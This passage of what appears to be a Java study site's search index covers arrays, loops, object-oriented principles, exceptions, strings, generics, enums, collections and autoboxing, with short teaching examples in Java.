<p>Length: The <code>length</code> property (not a method) gives the number of elements an array can hold. <pre><code>int[] data = {1, 2, 3};\nint arrayLength = data.length; // arrayLength will be 3\n</code></pre></p> <p>Accessing Elements: Array elements are accessed using a zero-based index. <pre><code>String[] fruits = {\"Apple\", \"Banana\", \"Cherry\"};\nString firstFruit = fruits[0]; // \"Apple\"\nfruits[1] = \"Blueberry\"; // Modifies the second element\n// Accessing fruits[3] would throw an ArrayIndexOutOfBoundsException\n</code></pre></p> <p>Common Manipulations (Examples inspired by <code>t1.md</code> Q12):</p> <ol> <li> <p>In-place Rotation (left by one): Modifies the original array.     <pre><code>public class ArrayRotateInPlace {\n    static void rotateLeftInPlace(int[] arr) {\n        if (arr == null || arr.length &lt;= 1) return;\n        int firstElement = arr[0]; // Store the first element\n        for (int i = 0; i &lt; arr.length - 1; i++) {\n            arr[i] = arr[i + 1]; // Shift elements to the left\n        }\n        arr[arr.length - 1] = firstElement; // Place first element at the end\n    }\n    public static void main(String[] args) {\n        int[] data = {1, 2, 3, 4, 5};\n        rotateLeftInPlace(data);\n        System.out.println(java.util.Arrays.toString(data)); // Output: [2, 3, 4, 5, 1]\n    }\n}\n</code></pre></p> </li> <li> <p>Returning a New Rotated Array (left by one): Original array remains unchanged.     <pre><code>public class ArrayRotateNew {\n    static int[] rotatedLeftNewArray(int[] arr) {\n        if (arr == null || arr.length == 0) return new int[0]; // Handle empty or null\n        if (arr.length == 1) return java.util.Arrays.copyOf(arr, arr.length);\n\n        int[] result = new int[arr.length];\n        int firstElement = arr[0];\n        for (int i = 0; i &lt; arr.length - 1; i++) {\n            result[i] = arr[i + 1];\n        }\n        result[arr.length - 1] = firstElement;\n        return result;\n    }\n    public static void main(String[] args) {\n        int[] originalData = {1, 2, 3, 4, 5};\n        int[] newData = rotatedLeftNewArray(originalData);\n        System.out.println(java.util.Arrays.toString(originalData)); // [1, 2, 3, 4, 5]\n        System.out.println(java.util.Arrays.toString(newData));    // [2, 3, 4, 5, 1]\n    }\n}\n</code></pre></p> </li> </ol>"},{"location":"cs/java/basics/concept/#18-loops","title":"1.8. Loops","text":"<p>Loops are used to execute a block of code repeatedly as long as a specified condition is true.</p> <p>Types of Loops:</p> Loop Type Description <code>for</code> loop Executes a block of code a specific number of times. <code>while</code> loop Repeatedly executes a block of code as long as a given condition is <code>true</code>. <code>do-while</code> loop Like <code>while</code>, but guarantees at least one execution of the loop body. <p>Loop Control Statements:</p> Statement Description <code>break</code> Exits the loop immediately. <code>continue</code> Skips the current iteration and proceeds to the next iteration of the loop. <p>Example: <pre><code>public class LoopExamples {\n    public static void main(String[] args) {\n        // For loop\n        for (int i = 0; i &lt; 5; i++) {\n            System.out.println(\"Iteration: \" + i);\n        }\n\n        // While loop\n        int j = 0;\n        while (j &lt; 5) {\n            System.out.println(\"While Iteration: \" + j);\n            j++;\n        }\n\n        // Do-while loop\n        int k = 0;\n        do {\n            System.out.println(\"Do-While Iteration: \" + k);\n            k++;\n        } while (k &lt; 5);\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#2-object-oriented-programming-oop","title":"2. Object-Oriented Programming (OOP)","text":"<p>OOP is a paradigm based on \"objects\", which contain data (attributes) and code (methods).</p> <p>Core Principles:</p> Principle Description Java Mechanisms Encapsulation Bundling data and methods within a class. Hiding internal state via <code>private</code> access and public getters/setters. Access modifiers (<code>private</code>, <code>protected</code>, <code>public</code>) Inheritance A new class (subclass) acquires properties/behaviors of an existing class (superclass). Promotes code reuse. <code>extends</code> keyword, <code>super</code> keyword Polymorphism \"Many forms\". Objects treated as instances of a common superclass, allowing a single action in different ways. Method Overriding (runtime), Method Overloading (compile-time) Abstraction Hiding complex implementation details, showing only essential features. Abstract classes, Interfaces"},{"location":"cs/java/basics/concept/#21-encapsulation","title":"2.1. Encapsulation","text":"<p>Example: <pre><code>class Person {\n    private String name; // Private variable\n    public String getName() { return name; } // Getter\n    public void setName(String name) { this.name = name; } // Setter\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#22-inheritance","title":"2.2. Inheritance","text":"<ul> <li><code>extends</code> keyword for class inheritance.</li> <li><code>super</code> keyword: Refers to superclass members. <code>super()</code> calls superclass constructor.</li> <li><code>this</code> keyword: Refers to current instance. <code>this()</code> calls another constructor in the same class.</li> </ul> <code>this()</code> <code>super()</code> Calls a constructor of the same class. Calls a constructor of the immediate superclass. Must be the first statement in a constructor. Must be the first statement in a constructor. <p>IS-A vs. HAS-A Relationships (inspired by <code>t1.md</code> Q10): Inheritance represents an \"IS-A\" relationship (e.g., a <code>Dog</code> IS-A <code>Animal</code>). This is different from a \"HAS-A\" relationship (composition), where a class contains an instance of another class (e.g., a <code>Car</code> HAS-A <code>Engine</code>). - <code>Potato</code> IS-A <code>Vegetable</code> (subclass relationship is reasonable). - <code>House</code> IS-A <code>Building</code> (subclass relationship is reasonable). - A <code>Window</code> is part of a <code>House</code> (HAS-A), not typically \"IS-A\" <code>House</code>.</p> <p>Example: <pre><code>class Animal {\n    Animal() { System.out.println(\"Animal created\"); }\n}\nclass Dog extends Animal { // Dog inherits from Animal\n    Dog() {\n        super(); // Calls Animal() constructor\n        System.out.println(\"Dog created\");\n    }\n    public static void main(String[] args) { new Dog(); }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#23-polymorphism","title":"2.3. Polymorphism","text":""},{"location":"cs/java/basics/concept/#231-method-overriding-runtime-polymorphism","title":"2.3.1. Method Overriding (Runtime Polymorphism)","text":"<ul> <li>Subclass provides specific implementation for a method in its superclass.</li> <li>Same name, parameters, return type (or covariant). Access modifier not more restrictive.</li> <li><code>@Override</code> annotation is recommended. <code>final</code> or <code>static</code> methods cannot be overridden.</li> </ul> <p>Example: <pre><code>class Vehicle { void run() { System.out.println(\"Vehicle running\"); } }\nclass Bike extends Vehicle {\n    @Override void run() { System.out.println(\"Bike running\"); }\n    public static void main(String[] args) {\n        Vehicle myVehicle = new Bike(); // Upcasting\n        myVehicle.run(); // Calls Bike's run()\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#232-method-overloading-compile-time-polymorphism","title":"2.3.2. Method Overloading (Compile-time Polymorphism)","text":"<ul> <li>Same class, same method name, different parameters (number, type, or order).</li> <li>Return type can differ but doesn't determine overloading.</li> </ul> <p>Example: <pre><code>class Adder {\n    static int add(int a, int b) { return a + b; }\n    static double add(double a, double b) { return a + b; } // Overloaded\n    public static void main(String[] args) {\n        System.out.println(Adder.add(5, 5));     // int version\n        System.out.println(Adder.add(5.5, 5.5)); // double version\n    }\n}\n</code></pre></p> <p>Comparison: Overloading vs. Overriding</p> Feature Method Overloading Method Overriding Purpose Increase readability. Provide specific implementation. Location Same class. Superclass/Subclass. Parameters Must be different. Must be the same. Return Type Can be different. Same or covariant. Polymorphism Compile-time (Static Binding). Run-time (Dynamic Binding)."},{"location":"cs/java/basics/concept/#24-abstraction","title":"2.4. Abstraction","text":"<p>Hiding implementation, showing functionality. Uses abstract classes and interfaces.</p>"},{"location":"cs/java/basics/concept/#241-abstract-class","title":"2.4.1. Abstract Class","text":"<ul> <li>Declared with <code>abstract</code>. Cannot be instantiated.</li> <li>Can have abstract (no body) and concrete methods.</li> <li>Subclass must implement all abstract methods or be abstract itself.</li> <li>Can have constructors, static/final methods, instance variables.</li> </ul> <p>Example: <pre><code>abstract class Shape { abstract void draw(); } // Abstract class &amp; method\nclass Circle extends Shape {\n    void draw() { System.out.println(\"Drawing Circle\"); }\n    public static void main(String[] args) {\n        Shape s = new Circle(); s.draw(); // Drawing Circle\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#242-interface","title":"2.4.2. Interface","text":"<ul> <li>Blueprint of a class (<code>interface</code> keyword). Cannot be instantiated.</li> <li>Contains <code>public abstract</code> methods and <code>public static final</code> constants by default.</li> <li>A class <code>implements</code> one or more interfaces. An interface can <code>extend</code> others.</li> <li>Java 8+: <code>default</code> and <code>static</code> methods with implementation. Java 9+: <code>private</code> methods.</li> </ul> <p>Example: <pre><code>interface Drawable { void draw(); } // Interface\nclass Rectangle implements Drawable {\n    public void draw() { System.out.println(\"Drawing rectangle\"); } // Must be public\n    public static void main(String[] args) {\n        Drawable d = new Rectangle(); d.draw(); // Drawing rectangle\n    }\n}\n</code></pre></p> <p>Comparison: Abstract Class vs. Interface</p> Feature Abstract Class Interface Methods Abstract and concrete methods. <code>public abstract</code> methods (default). Java 8+ default/static. Variables Any type of variable. <code>public static final</code> constants only. Inheritance Class extends one abstract class. Class implements multiple interfaces. Constructors Yes (called via <code>super()</code>). No. Purpose Share common code (IS-A with shared state/behavior). Define a contract (CAN-DO). Multiple inheritance of type."},{"location":"cs/java/basics/concept/#3-constructors","title":"3. Constructors","text":"<ul> <li>Special method to initialize objects. Same name as class, no return type.</li> <li>Default Constructor: No parameters. Compiler-provided if none defined.</li> <li>Parameterized Constructor: Has parameters for initialization.</li> <li>Constructor Overloading: Multiple constructors with different parameters.</li> </ul> <p>Example: <pre><code>class Box {\n    Box() { System.out.println(\"Box created (no-arg)\"); }\n    Box(int size) { System.out.println(\"Box created (size: \" + size + \")\"); }\n    public static void main(String[] args) {\n        new Box(); new Box(10);\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#4-exception-handling","title":"4. Exception Handling","text":"<p>Handles runtime errors using <code>try</code>, <code>catch</code>, <code>finally</code>, <code>throw</code>, <code>throws</code>.</p> <p>Hierarchy: <code>Throwable</code> -&gt; <code>Error</code> (unrecoverable) &amp; <code>Exception</code> (recoverable). <code>Exception</code> -&gt; <code>RuntimeException</code> (unchecked) &amp; other exceptions (checked).</p> Keyword Description <code>try</code> Code block monitored for exceptions. <code>catch</code> Handles specific exception types from <code>try</code> block. <code>finally</code> Always executed, for cleanup (e.g., closing resources). <code>throw</code> Explicitly throws an exception instance. <code>throws</code> Declares exceptions a method might throw (caller handles). <p>Checked vs. Unchecked Exceptions:</p> Feature Checked Exceptions Unchecked Exceptions (RuntimeExceptions) Compiler Check Checked at compile-time. Not checked at compile-time. Handling Must be handled (<code>try-catch</code>) or declared (<code>throws</code>). Optional handling. Examples <code>IOException</code>, <code>SQLException</code>. <code>NullPointerException</code>, <code>ArrayIndexOutOfBoundsException</code>. <p>Exception Propagation (inspired by <code>t2.md</code> Q6): If an exception is thrown and not caught within the current method's <code>try-catch</code> block (or if there's no <code>try-catch</code>), it propagates up the call stack to the caller method. This process continues until a suitable <code>catch</code> block is found. If the exception reaches the <code>main</code> method and is not caught, the program terminates, and the exception stack trace is printed.</p> <p>Input Pre-validation (inspired by <code>2024.s1.md</code> Q5): It's good practice to validate inputs before performing operations that might lead to errors or inconsistent states. This often involves checking all inputs for validity at the beginning of a method. <pre><code>// Conceptual example for input validation\nclass DataProcessor {\n    public void processInputs(int[] inputs) {\n        // 1. Validate all inputs first\n        for (int input : inputs) {\n            if (!isValid(input)) {\n                throw new IllegalArgumentException(\"Invalid input detected: \" + input);\n            }\n        }\n        // 2. Proceed with processing if all inputs are valid\n        for (int input : inputs) {\n            // perform operation on 'input'\n            System.out.println(\"Processing valid input: \" + input);\n        }\n    }\n    private boolean isValid(int input) {\n        return input &gt;= 0; // Example validation logic\n    }\n    public static void main(String[] args) {\n        DataProcessor processor = new DataProcessor();\n        try {\n            processor.processInputs(new int[]{1, 2, -1, 3});\n        } catch (IllegalArgumentException e) {\n            System.err.println(e.getMessage()); // Invalid input detected: -1\n        }\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#5-strings","title":"5. Strings","text":"<p><code>String</code> objects represent character sequences and are immutable.</p>"},{"location":"cs/java/basics/concept/#51-string-immutability","title":"5.1. String Immutability","text":"<ul> <li>Once a <code>String</code> object is created, its value cannot change.</li> <li>Operations like concatenation create new <code>String</code> objects.</li> <li>Benefits: Thread safety, security, caching (string pool).</li> </ul> <p>String Immutability and Arrays (inspired by <code>2024.s1.md</code> Q4): While <code>String</code> objects are immutable, an array of <code>String</code> (i.e., <code>String[]</code>) is mutable. Modifying an element of a <code>String</code> array means changing the reference stored in that array slot to point to a different <code>String</code> object. The original <code>String</code> objects themselves remain unchanged in memory. <pre><code>public class StringArrayModification {\n    public static void main(String[] args) {\n        String[] words = {\"these\", \"words\", \"change\"};\n        // words[0] refers to \"these\", words[1] to \"words\", words[2] to \"change\".\n\n        // Concatenation creates a new String object \"thesewords\".\n        // words[2] is updated to refer to this new String object.\n        words[2] = words[0] + words[1];\n\n        // words[1] is updated to refer to the same String object as words[0] (\"these\").\n        words[1] = words[0];\n\n        // The original String objects (\"these\", \"words\", \"change\") are still immutable.\n        // What changed are the references held by the 'words' array elements.\n        System.out.println(java.util.Arrays.toString(words)); // Output: [these, these, thesewords]\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#52-string-vs-stringbuilder-vs-stringbuffer","title":"5.2. <code>String</code> vs. <code>StringBuilder</code> vs. <code>StringBuffer</code>","text":"Feature <code>String</code> <code>StringBuilder</code> <code>StringBuffer</code> Mutability Immutable Mutable Mutable Thread-Safe Yes (due to immutability) No (not synchronized) Yes (synchronized methods) Performance Slower for frequent modifications Faster for frequent modifications Slower than <code>StringBuilder</code> (due to sync) Use Case Fixed strings, infrequent changes. Single-threaded, frequent modifications. Multi-threaded, frequent modifications. <p>Example: <pre><code>public class StringTypes {\n    public static void main(String[] args) {\n        String s1 = \"Java\"; s1.concat(\" World\"); // s1 is still \"Java\"\n        System.out.println(s1);\n\n        StringBuilder sb = new StringBuilder(\"Hello\");\n        sb.append(\" World\"); System.out.println(sb); // Hello World\n\n        StringBuffer sbf = new StringBuffer(\"Hi\");\n        sbf.append(\" There\"); System.out.println(sbf); // Hi There\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#6-inner-classes","title":"6. Inner Classes","text":"<p>A class defined within another class.</p> Type Description Access to Outer Members Instantiation Member Inner Class Non-static, defined at class member level. All (static &amp; instance) <code>OuterClass.InnerClass i = outerObj.new InnerClass();</code> Static Nested Class <code>static</code> class within another class. Static members only <code>OuterClass.StaticNestedClass n = new OuterClass.StaticNestedClass();</code> Local Inner Class Defined within a method/block. Outer members, final/effectively final local vars Inside method/block. Anonymous Inner Class Nameless class, defined and instantiated simultaneously. For concise interface/class extension. Similar to local inner <code>new InterfaceOrSuperclass() { /*body*/ };</code> <p>Example: Member Inner Class <pre><code>class Outer {\n    private int data = 10;\n    class Inner { void show() { System.out.println(\"Data: \" + data); } }\n    public static void main(String[] args) {\n        Outer o = new Outer(); Outer.Inner i = o.new Inner(); i.show(); // Data: 10\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#7-generics","title":"7. Generics","text":"<p>Enable type parameterization for classes, interfaces, and methods for compile-time type safety.</p> <p>Example: <pre><code>class Box&lt;T&gt; { // Generic class\n    private T item;\n    public void set(T item) { this.item = item; }\n    public T get() { return item; }\n\n    public static void main(String[] args) {\n        Box&lt;Integer&gt; intBox = new Box&lt;&gt;(); intBox.set(100);\n        System.out.println(\"Integer: \" + intBox.get());\n        Box&lt;String&gt; strBox = new Box&lt;&gt;(); strBox.set(\"Hi\");\n        System.out.println(\"String: \" + strBox.get());\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#71-multiple-type-parameters","title":"7.1. Multiple Type Parameters","text":"<p><code>class Pair&lt;K, V&gt; { K key; V value; ... }</code></p>"},{"location":"cs/java/basics/concept/#72-bounded-type-parameters","title":"7.2. Bounded Type Parameters","text":"<p>Restricts the types that can be used as type arguments. Uses <code>extends</code> (for classes or interfaces). - <code>&lt;T extends Number&gt;</code>: <code>T</code> can be <code>Number</code> or any subclass of <code>Number</code> (e.g., <code>Integer</code>, <code>Double</code>). - <code>&lt;T extends Runnable&gt;</code>: <code>T</code> must be a type that implements the <code>Runnable</code> interface.</p> <p>Example: Bounded Type Parameter <pre><code>class Stats&lt;T extends Number&gt; {\n    T[] nums;\n    Stats(T[] o) { nums = o; }\n    double average() {\n        double sum = 0.0;\n        for (T num : nums) sum += num.doubleValue();\n        return sum / nums.length;\n    }\n    public static void main(String[] args) {\n        Integer[] iNums = {1, 2, 3, 4, 5};\n        Stats&lt;Integer&gt; iStats = new Stats&lt;&gt;(iNums);\n        System.out.println(\"Avg: \" + iStats.average()); // Avg: 3.0\n        // String[] sNums = {\"a\", \"b\"}; // Error: String not a Number\n        // Stats&lt;String&gt; sStats = new Stats&lt;&gt;(sNums);\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#73-generic-interfaces","title":"7.3. Generic Interfaces","text":"<p>Interfaces can also be generic. Example: <code>Comparable&lt;T&gt;</code>. <pre><code>interface MinMax&lt;T extends Comparable&lt;T&gt;&gt; {\n    T min();\n    T max();\n}\nclass MyClass&lt;T extends Comparable&lt;T&gt;&gt; implements MinMax&lt;T&gt; {\n    T[] vals;\n    MyClass(T[] o) { vals = o; }\n    public T min() { /* ... */ return vals[0]; } // Simplified\n    public T max() { /* ... */ return vals[0]; } // Simplified\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#74-generic-methods","title":"7.4. Generic Methods","text":"<p>Methods can have their own type parameters, independent of any class-level type parameters. - Type parameter list is placed before the return type: <code>public static &lt;E&gt; void printArray(E[] elements)</code></p> <p>Example: Generic Method <pre><code>public class GenericMethodDemo {\n    public static &lt;E&gt; void printArray(E[] elements) {\n        for (E element : elements) System.out.print(element + \" \");\n        System.out.println();\n    }\n    public static void main(String[] args) {\n        Integer[] intArray = {1, 2, 3};\n        String[] stringArray = {\"A\", \"B\", \"C\"};\n        printArray(intArray);    // 1 2 3\n        printArray(stringArray); // A B C\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#75-type-erasure","title":"7.5. Type Erasure","text":"<p>Java generics are implemented using type erasure. Generic type information is present only at compile time and is erased at runtime. - Type parameters are replaced by their bounds (or <code>Object</code> if unbounded). - Compiler inserts casts where necessary. - Limitations: Cannot create instances of type parameters (<code>new T()</code>), cannot create arrays of generic types (<code>new T[5]</code>), <code>instanceof</code> checks for parameterized types don't work as expected at runtime (<code>obj instanceof List&lt;String&gt;</code>).</p>"},{"location":"cs/java/basics/concept/#76-type-inference-with-var-and-diamond-operator-inspired-by-t2md-q11","title":"7.6. Type Inference with <code>var</code> and Diamond Operator (inspired by <code>t2.md</code> Q11)","text":"<p>Java provides type inference features to make generic code more concise:</p> <ul> <li>Diamond Operator (<code>&lt;&gt;</code>) (Java 7+): If the generic type is explicitly declared on the left-hand side of an assignment, you can use an empty set of angle brackets (<code>&lt;&gt;</code>) on the right-hand side (the \"diamond operator\"). The compiler infers the type arguments from the context.     <pre><code>List&lt;String&gt; namesList = new ArrayList&lt;String&gt;(); // Pre-Java 7\nList&lt;String&gt; namesListDiamond = new ArrayList&lt;&gt;(); // Java 7+\nMap&lt;String, List&lt;Integer&gt;&gt; complexMap = new HashMap&lt;&gt;();\n</code></pre></li> </ul> <ul> <li><code>var</code> Keyword (Java 10+): For local variable type inference, <code>var</code> can be used if the compiler can infer the type from the initializer expression on the right-hand side.     <pre><code>var messages = new ArrayList&lt;String&gt;(); // messages is ArrayList&lt;String&gt;\nvar userScores = new HashMap&lt;String, Integer&gt;(); // userScores is HashMap&lt;String, Integer&gt;\n\n// Combining var with the diamond operator:\nvar inferredObjectList = new ArrayList&lt;&gt;(); // Type of inferredObjectList is ArrayList&lt;Object&gt;\n                                          // because no type info for elements on the right.\nvar specificStringList = new ArrayList&lt;String&gt;(); // Type is ArrayList&lt;String&gt;\n</code></pre>     When using <code>var</code>, ensure the right-hand side provides enough information for the desired type, or be aware it might infer a more general type like <code>Object</code>.</li> </ul> <p>Example: Generic Method with Type Inference Consider a generic method: <pre><code>class GenericUtil {\n    static &lt;T&gt; ArrayList&lt;T&gt; selectFromArray(ArrayList&lt;T&gt; data, int[] indices) {\n        // Explicit type for 'result' with diamond operator\n        ArrayList&lt;T&gt; result = new ArrayList&lt;&gt;();\n\n        // Alternatively, using var (Java 10+):\n        // var result = new ArrayList&lt;T&gt;(); // T must be inferable for the list elements\n\n        for (int index : indices) {\n            if (index &gt;= 0 &amp;&amp; index &lt; data.size()) {\n                result.add(data.get(index));\n            }\n        }\n        return result;\n    }\n    public static void main(String[] args) {\n        var numbers = new ArrayList&lt;Integer&gt;();\n        numbers.add(10); numbers.add(20); numbers.add(30);\n        int[] selection = {0, 2};\n        ArrayList&lt;Integer&gt; selectedNumbers = selectFromArray(numbers, selection);\n        System.out.println(selectedNumbers); // [10, 30]\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#8-enums-enumerations","title":"8. Enums (Enumerations)","text":"<p>Enums (enumerations) define a special data type that enables a variable to be a set of predefined constants. The variable must be equal to one of the values that have been predefined for it. Enums are type-safe and improve code readability and maintainability.</p> <ul> <li>Definition: <code>enum Day { SUNDAY, MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY }</code></li> <li>Usage: <code>Day today = Day.MONDAY;</code></li> <li>Implicitly extends <code>java.lang.Enum</code>: Cannot extend other classes or be extended.</li> <li>Can have fields, constructors, and methods: Constructors are implicitly <code>private</code>.</li> </ul> <p>Key <code>java.lang.Enum</code> methods: - <code>values()</code>: Returns an array containing all enum constants. - <code>ordinal()</code>: Returns the zero-based position of the constant in its enum declaration. - <code>valueOf(String name)</code>: Returns the enum constant of the specified name.</p> <p>Example with fields and methods: <pre><code>enum TrafficLight {\n    RED(\"Stop\"), GREEN(\"Go\"), YELLOW(\"Caution\");\n\n    private String action;\n\n    TrafficLight(String action) { // Constructor is implicitly private\n        this.action = action;\n    }\n\n    public String getAction() { return this.action; }\n\n    public static void main(String[] args) {\n        TrafficLight light = TrafficLight.RED;\n        System.out.println(light + \": \" + light.getAction()); // RED: Stop\n        for (TrafficLight tl : TrafficLight.values()) {\n            System.out.println(tl + \" (ordinal \" + tl.ordinal() + \")\");\n        }\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#9-important-object-methods-equals-and-hashcode","title":"9. Important Object Methods: <code>equals()</code> and <code>hashCode()</code>","text":"<ul> <li><code>equals(Object obj)</code>: In <code>Object</code> class, checks reference equality (<code>==</code>) by default. Override for logical equality.</li> <li>Contract: Reflexive, Symmetric, Transitive, Consistent. <code>x.equals(null)</code> is <code>false</code>.</li> <li><code>hashCode()</code>: In <code>Object</code> class, returns an integer hash.</li> <li>Contract: If <code>obj1.equals(obj2)</code>, then <code>obj1.hashCode() == obj2.hashCode()</code>. Consistent return unless <code>equals</code> data changes.</li> <li>Override both or neither: Essential for correct behavior in hash-based collections (<code>HashMap</code>, <code>HashSet</code>).</li> </ul> <p>Conceptual Example: <pre><code>class Student {\n    int id; String name;\n    // Constructor...\n    @Override public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Student s = (Student) o;\n        return id == s.id &amp;&amp; java.util.Objects.equals(name, s.name);\n    }\n    @Override public int hashCode() {\n        return java.util.Objects.hash(id, name);\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#10-collections-framework-overview","title":"10. Collections Framework (Overview)","text":"<p>Unified architecture for collections. Key interfaces: <code>List</code>, <code>Set</code>, <code>Queue</code>, <code>Map</code>.</p> Collection Type Key Characteristics Common Implementations <code>ArrayList</code> Dynamic array, ordered, duplicates, fast random access. <code>List&lt;String&gt; list = new ArrayList&lt;&gt;();</code> <code>LinkedList</code> Doubly-linked list, ordered, duplicates, fast insert/delete. <code>List&lt;String&gt; list = new LinkedList&lt;&gt;();</code> <code>HashSet</code> Hash table, unordered, no duplicates. Allows one <code>null</code>. <code>Set&lt;String&gt; set = new HashSet&lt;&gt;();</code> <code>TreeSet</code> Tree (Red-Black), sorted, no duplicates. No <code>null</code> (usually). <code>Set&lt;String&gt; set = new TreeSet&lt;&gt;();</code> <code>HashMap</code> Hash table, unordered, key-value, unique keys. <code>null</code> key/values allowed. <code>Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();</code> <code>TreeMap</code> Tree, sorted by keys, key-value, unique keys. No <code>null</code> key (usually). <code>Map&lt;String, Integer&gt; map = new TreeMap&lt;&gt;();</code> <p>Example: <code>ArrayList</code> <pre><code>import java.util.ArrayList; import java.util.List;\npublic class ArrayListDemo {\n    public static void main(String[] args) {\n        List&lt;String&gt; names = new ArrayList&lt;&gt;();\n        names.add(\"Alice\"); names.add(\"Bob\");\n        System.out.println(names.get(0)); // Alice\n        for (String name : names) System.out.println(name);\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#11-autoboxing-and-unboxing","title":"11. Autoboxing and Unboxing","text":"<p>Java provides wrapper classes for each primitive data type (e.g., <code>Integer</code> for <code>int</code>, <code>Double</code> for <code>double</code>). - Autoboxing: Automatic conversion of a primitive type to its corresponding wrapper class object. <code>Integer i = 10;</code> - Unboxing: Automatic conversion of a wrapper class object to its corresponding primitive type. <code>int val = i;</code></p> <p>Use Cases: - Storing primitives in collections that require objects (e.g., <code>ArrayList&lt;Integer&gt;</code>). - Using primitives with generic types.</p> <p>Potential Issues: - Performance: Object creation can be slower than using primitives directly. - <code>NullPointerException</code>: Unboxing a <code>null</code> wrapper object will throw a <code>NullPointerException</code>. <code>Integer num = null; int n = num; // Throws NullPointerException</code></p>"},{"location":"cs/java/basics/concept/#12-generics","title":"12. Generics","text":"<p>Generics enable types (classes and interfaces) to be parameters when defining classes, interfaces, and methods. This provides compile-time type safety and reduces the need for type casting.</p> <ul> <li>Type Parameter: A placeholder for a specific type, e.g., <code>T</code> in <code>class Box&lt;T&gt; {}</code>.</li> <li>Instantiation: <code>Box&lt;String&gt; stringBox = new Box&lt;&gt;();</code></li> <li>Benefits: Type safety at compile time, code reusability, no need for explicit casts.</li> <li>Cannot use primitive types: Use wrapper classes instead (autoboxing helps).</li> </ul> <p>Example: Generic Class <pre><code>class Storage&lt;T&gt; {\n    private T item;\n    public void setItem(T item) { this.item = item; }\n    public T getItem() { return item; }\n\n    public static void main(String[] args) {\n        Storage&lt;Integer&gt; numStorage = new Storage&lt;&gt;();\n        numStorage.setItem(100);\n        // numStorage.setItem(\"Hello\"); // Compile-time error\n        System.out.println(\"Item: \" + numStorage.getItem());\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#121-multiple-type-parameters","title":"12.1. Multiple Type Parameters","text":"<p><code>class Pair&lt;K, V&gt; { K key; V value; ... }</code></p>"},{"location":"cs/java/basics/concept/#122-bounded-type-parameters","title":"12.2. Bounded Type Parameters","text":"<p>Restricts the types that can be used as type arguments. Uses <code>extends</code> (for classes or interfaces). - <code>&lt;T extends Number&gt;</code>: <code>T</code> can be <code>Number</code> or any subclass of <code>Number</code> (e.g., <code>Integer</code>, <code>Double</code>). - <code>&lt;T extends Runnable&gt;</code>: <code>T</code> must be a type that implements the <code>Runnable</code> interface.</p> <p>Example: Bounded Type Parameter <pre><code>class Stats&lt;T extends Number&gt; {\n    T[] nums;\n    Stats(T[] o) { nums = o; }\n    double average() {\n        double sum = 0.0;\n        for (T num : nums) sum += num.doubleValue();\n        return sum / nums.length;\n    }\n    public static void main(String[] args) {\n        Integer[] iNums = {1, 2, 3, 4, 5};\n        Stats&lt;Integer&gt; iStats = new Stats&lt;&gt;(iNums);\n        System.out.println(\"Avg: \" + iStats.average()); // Avg: 3.0\n        // String[] sNums = {\"a\", \"b\"}; // Error: String not a Number\n        // Stats&lt;String&gt; sStats = new Stats&lt;&gt;(sNums);\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#123-generic-interfaces","title":"12.3. Generic Interfaces","text":"<p>Interfaces can also be generic. Example: <code>Comparable&lt;T&gt;</code>. <pre><code>interface MinMax&lt;T extends Comparable&lt;T&gt;&gt; {\n    T min();\n    T max();\n}\nclass MyClass&lt;T extends Comparable&lt;T&gt;&gt; implements MinMax&lt;T&gt; {\n    T[] vals;\n    MyClass(T[] o) { vals = o; }\n    public T min() { /* ... */ return vals[0]; } // Simplified\n    public T max() { /* ... */ return vals[0]; } // Simplified\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#124-generic-methods","title":"12.4. Generic Methods","text":"<p>Methods can have their own type parameters, independent of any class-level type parameters. - Type parameter list is placed before the return type: <code>public static &lt;E&gt; void printArray(E[] elements)</code></p> <p>Example: Generic Method <pre><code>public class GenericMethodDemo {\n    public static &lt;E&gt; void printArray(E[] elements) {\n        for (E element : elements) System.out.print(element + \" \");\n        System.out.println();\n    }\n    public static void main(String[] args) {\n        Integer[] intArray = {1, 2, 3};\n        String[] stringArray = {\"A\", \"B\", \"C\"};\n        printArray(intArray);    // 1 2 3\n        printArray(stringArray); // A B C\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#125-type-erasure","title":"12.5. Type Erasure","text":"<p>Java generics are implemented using type erasure. Generic type information is present only at compile time and is erased at runtime. - Type parameters are replaced by their bounds (or <code>Object</code> if unbounded). - Compiler inserts casts where necessary. - Limitations: Cannot create instances of type parameters (<code>new T()</code>), cannot create arrays of generic types (<code>new T[5]</code>), <code>instanceof</code> checks for parameterized types don't work as expected at runtime (<code>obj instanceof List&lt;String&gt;</code>).</p>"},{"location":"cs/java/basics/concept/#126-type-inference-with-var-and-diamond-operator-inspired-by-t2md-q11","title":"12.6. Type Inference with <code>var</code> and Diamond Operator (inspired by <code>t2.md</code> Q11)","text":"<p>Java provides type inference features to make generic code more concise:</p> <ul> <li>Diamond Operator (<code>&lt;&gt;</code>) (Java 7+): If the generic type is explicitly declared on the left-hand side of an assignment, you can use an empty set of angle brackets (<code>&lt;&gt;</code>) on the right-hand side (the \"diamond operator\"). The compiler infers the type arguments from the context.     <pre><code>List&lt;String&gt; namesList = new ArrayList&lt;String&gt;(); // Pre-Java 7\nList&lt;String&gt; 